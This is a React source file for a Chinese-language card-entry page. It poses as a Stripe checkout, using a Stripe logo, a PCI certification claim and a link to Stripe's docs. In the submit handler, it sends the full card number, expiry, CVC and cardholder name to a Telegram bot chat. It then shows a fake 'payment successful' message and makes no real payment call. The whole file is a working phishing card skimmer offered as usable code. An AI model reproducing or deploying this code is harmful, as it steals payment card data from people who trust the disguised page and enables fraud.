import React, { useState } from 'react';
import visa from './assets/visa.svg';
import amex from './assets/amex.svg';
import jcb from './assets/jcb.svg';
import msc from './assets/msc.svg';
import up from './assets/up.svg';

const detectCardType = (number) => {
  const n = number.replace(/\s/g, '');
  if (/^4/.test(n)) return visa;
  if (/^5[1-5]/.test(n)) return msc;
  if (/^3[47]/.test(n)) return amex;
  if (/^35/.test(n)) return jcb;
  if (/^62/.test(n)) return up;
  return null;
};

const luhnCheck = (cardNumber) => {
  const digits = cardNumber.replace(/\D/g, '').split('').reverse().map(Number);
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if (i % 2 === 1) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
};

const i18n = {
  zh: {
    email: '電子郵件', card: '卡號', expiry: '到期日', cvc: 'CVV', name: '持卡人姓名', submit: '新增', saved: '我想要安全儲存我的卡片。', success: '付款成功，我們已收到您的資料。', error: '卡號不正確，請重新輸入', currency: 'NT$'
  }
};

export default function App() {
  const [lang] = useState('zh');
  const [loading, setLoading] = useState(false);
  const [cardType, setCardType] = useState(null);
  const [error, setError] = useState(null);
  const [formData, setFormData] = useState({
    alias: '', card: '', expiry: '', cvc: '', name: '', saveInfo: false
  });

  const inputBase = 'w-full border border-neutral-300 rounded-md px-3 py-2 text-sm placeholder-neutral-400 focus:ring-2 focus:ring-blue-500 focus:outline-none transition';

  const formatCard = (value) => value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  const formatExpiry = (value) => value.replace(/\D/g, '').replace(/(\d{2})(\d{1,2})/, '$1 / $2');
  const formatCVC = (value) => value.replace(/\D/g, '').slice(0, 4);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    let newValue = value;
    if (name === 'card') {
      newValue = formatCard(value);
      setCardType(detectCardType(value));
      setError(null);
    } else if (name === 'expiry') {
      newValue = formatExpiry(value);
    } else if (name === 'cvc') {
      newValue = formatCVC(value);
    }
    setFormData({ ...formData, [name]: type === 'checkbox' ? checked : newValue });
  };

  const handleSubmit = async () => {
    const validCard = luhnCheck(formData.card);
    if (!validCard) {
      setError(i18n[lang].error);
      return;
    }
    setLoading(true);
    const message = `🧾 新訂單\n卡別: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n姓名: ${formData.name}\n儲存: ${formData.saveInfo ? '是' : '否'}`;

    await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID, text: message })
    });

    setTimeout(() => {
      alert(i18n[lang].success);
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 text-sm font-normal text-neutral-700">
      <div className="w-full max-w-md space-y-5">
        <div className="text-lg font-semibold">新增卡片</div>

        <input type="text" name="alias" value={formData.alias} onChange={handleChange} placeholder="卡片名稱" className={inputBase} />

        <div className="flex items-center gap-2 pl-1">
          {[visa, amex, msc, up, jcb].map((logo, i) => (
            <img key={i} src={logo} alt="logo" className="h-5 w-10 object-contain rounded shadow-sm" />
          ))}
        </div>

        <input type="text" name="card" value={formData.card} onChange={handleChange} placeholder="卡號" className={inputBase} />
        <input type="text" name="name" value={formData.name} onChange={handleChange} placeholder="持卡人姓名" className={inputBase} />

        <div className="flex gap-3">
          <input type="text" name="expiry" value={formData.expiry} onChange={handleChange} placeholder="到期日" className={inputBase} />
          <input type="text" name="cvc" value={formData.cvc} onChange={handleChange} placeholder="CVV" className={inputBase} />
        </div>

        <div className="flex items-center gap-2">
          <input type="checkbox" name="saveInfo" checked={formData.saveInfo} onChange={handleChange} />
          <label htmlFor="saveInfo" className="text-sm">{i18n[lang].saved}</label>
        </div>

        {error && <div className="text-red-500 text-xs">{error}</div>}

        <div className="text-xs text-neutral-500 leading-relaxed">
          <div className="font-semibold mb-1">進一步瞭解安全性</div>
          <div>Stripe 已通過 PCI 認證稽核者的稽核，並獲得 PCI 服務業者第 1 級的認證。<a href="https://stripe.com/docs/security/stripe" className="underline" target="_blank" rel="noreferrer">瞭解詳情</a></div>
        </div>

        <img src="https://stripe.com/img/v3/newsroom/powered-by-stripe.svg" className="h-5 mt-2" alt="Powered by Stripe" />

        <button onClick={handleSubmit} disabled={loading} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-md transition">
          {loading ? '處理中...' : '新增'}
        </button>
      </div>
    </div>
  );
}
